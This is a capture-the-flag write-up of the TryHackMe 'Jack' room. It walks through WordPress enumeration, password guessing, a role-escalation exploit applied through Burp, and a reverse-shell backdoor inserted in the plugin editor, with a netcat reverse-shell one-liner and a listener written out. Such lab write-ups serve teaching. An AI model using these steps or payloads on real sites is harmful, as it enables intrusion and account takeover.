# JACK-ROOM-From-THM
TryHackMe machine “Jack”: a step-by-step guide from reconnaissance and enumeration to exploitation and privilege escalation. Includes the exact commands used, attacker reasoning, and tips to help beginners quickly grasp the pentesting workflow.
<h3>  <img width="791" height="860" alt="image" src="https://github.com/user-attachments/assets/978b0eea-0802-441a-b8bc-0dc543775ae5" />
 </h3>
<h3>Maltego simulation map of the penetration test against the TryHackMe ‘Jack’ room.</h3>
===========================================================================
<h1>Pentest Summary — TryHackMe "Jack"</h1>

<h2>Primary Steps</h2>
<ul>
  <li><label><input type="checkbox"> <strong>1. Scope & Target Confirmation</strong> — define scope and confirm permitted targets.</label></li>
  <li><label><input type="checkbox"> <strong>2. Reconnaissance & Scanning</strong> — scan the target to discover open ports, services, and suspicious assets.</label></li>
  <li><label><input type="checkbox"> <strong>3. Service Exploitation</strong> — test and attack suspicious services discovered during enumeration.</label></li>
  <li><label><input type="checkbox"> <strong>4. Initial Access</strong> — exploit a vulnerability to obtain a reverse shell / install a backdoor (lab-permitted only).</label></li>
  <li><label><input type="checkbox"> <strong>5. Privilege Escalation</strong> — discover and exploit vectors to escalate to root / administrator.</label></li>
</ul>
<hr/>
===========================================================================
<h1>1. Scope & Target Confirmation</h1>
<h2>Connect to OpenVPN</h2>
<h3>(assumes you have a .ovpn file such as jack.ovpn or tryhackme.ovpn)</h3>
<h4>Run from a terminal (Linux / WSL / macOS with OpenVPN installed):</h4>
=== run in foreground to see logs ===
<h5>sudo openvpn --config ~/Downloads/jack.ovpn</h5>
<h2>Edit /etc/hosts to map the lab IP to jack.thm</h2>
<h4>Interactive (nano)</h4>
<h5>sudo nano /etc/hosts</h5>
# add the line:
# 10.201.127.126    jack.thm
# Save: Ctrl+O, Enter. Exit: Ctrl+X
<h2>Verify connectivity</h2>
# ping the hostname
<h5>ping -c 3 jack.thm</h5>

<h1>2. Reconnaissance & Scanning</h1>
<h2>Performed an nmap scan which revealed an HTTP service hosting WordPress.</h2>

<img width="1309" height="587" alt="2" src="https://github.com/user-attachments/assets/ae95a920-4b1e-49bc-ad73-a55778d34235" />
<h5>use the tool with a command: sudo nmap -sV -sC --open -oA nmap jack.thm</h5>
==> "_/wp-admin/"
<h2>WordPress enumeration (WPScan)</h2>

<img width="928" height="651" alt="3" src="https://github.com/user-attachments/assets/428c2d55-3695-42ed-804d-22770e4fe8b4" />
<h5>use the tool with a command: wpscan -e u,ap --url http://jack.thm</h5>
I see 3 users in WordPress
<img width="1482" height="532" alt="user" src="https://github.com/user-attachments/assets/532d3a37-9a87-44a5-b13d-c75faf65c317" />

Write the names of 3 users into the users.txt file and proceed to scan passwords using a wordlist
<img width="1450" height="624" alt="4_doPass" src="https://github.com/user-attachments/assets/9b6db981-3e4b-4304-8c86-5ed08f1b5504" />

I already have Wendy's password
<img width="1913" height="641" alt="5_coPass" src="https://github.com/user-attachments/assets/80d2b1c7-8aed-40fc-a5f7-e1bf38ff90d7" />

Login page wordpress http://jack.thm/wp-login.php
<img width="657" height="707" alt="5_5" src="https://github.com/user-attachments/assets/87551683-70b4-419d-b78c-4060f1d763bf" />

<h1>3. Service Exploitation</h1>
<h2>I conducted a WordPress vulnerability search and identified it in the file 44595.rb.</h2>

<h5>I use the command: searchsploit wordpress privilege</h5>
<img width="1911" height="108" alt="6" src="https://github.com/user-attachments/assets/1b518b28-3780-4b52-a250-b1a311769cec" />

I see and identify that the reasonable vulnerability is the file 44595.rb
<img width="1885" height="294" alt="7" src="https://github.com/user-attachments/assets/acd61079-3af7-452e-8cc5-e9b87cea87c9" />

I use a command to download that file to my computer
<h5>searchsploit -m 44595.rb</h5>

<h1>4. Initial Access</h1>
<h2>After completing the preceding tasks, I will use Burp Suite to assess the application’s access controls and permission model.</h2>

<h3>First, go to Burp Suite to enable intercept in the proxy section.</h3>
<img width="1399" height="434" alt="image" src="https://github.com/user-attachments/assets/67363202-95ee-4a97-a2c7-52217e743e82" />

<h3>At that time, I logged into WordPress with the username and password I had previously obtained, went to the profile section, and clicked update.</h3>
<img width="844" height="701" alt="image" src="https://github.com/user-attachments/assets/c930fd6e-6ae7-4ed3-8932-769493210734" />
===============
<img width="611" height="486" alt="image" src="https://github.com/user-attachments/assets/220b6db3-da28-4754-a74d-fb7ce21485e6" />
===============
<img width="931" height="490" alt="image" src="https://github.com/user-attachments/assets/0c1bbe19-c514-4e49-9f59-5fe6fe1fe9c3" />

<h3>When you press update, you will go into Burp Suite, filter out the link for the update part, and proceed to forward from the vulnerability in the file 44595.rb.</h3>
<img width="1606" height="306" alt="image" src="https://github.com/user-attachments/assets/5d610188-18d2-42d1-abcd-bc8379e873f5" />
===============
<img width="1617" height="484" alt="image" src="https://github.com/user-attachments/assets/f039b8a6-007d-46db-bbd6-bbcd98e536f0" />
Then click ‘Forward.’
====>You currently have administrator privileges.

<h3>Then, in the WordPress dashboard, you have partial administrator privileges. Go to Plugins → Editor.</h3>
<img width="828" height="379" alt="image" src="https://github.com/user-attachments/assets/7deb632e-13d5-41ca-a9e0-ddb56579897d" />
===============
<h3>Go to the reverse-shell page and get an appropriate reverse-shell backdoor to insert into the PHP code.</h3>
<img width="1138" height="277" alt="image" src="https://github.com/user-attachments/assets/4cf4443e-e6f6-43ee-9e9d-6b7471e99119" />
<h5>Code reverse shell:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f </h5>
<h3>Please confirm using the Update button below, then open a terminal and run a listener on the port you intend to use for the backdoor.</h3>
<img width="887" height="299" alt="image" src="https://github.com/user-attachments/assets/9ab431cb-5c24-4ef1-9417-5da62a348955" />
<h5>Code listen: nc -lvnp "PORT"</h5>

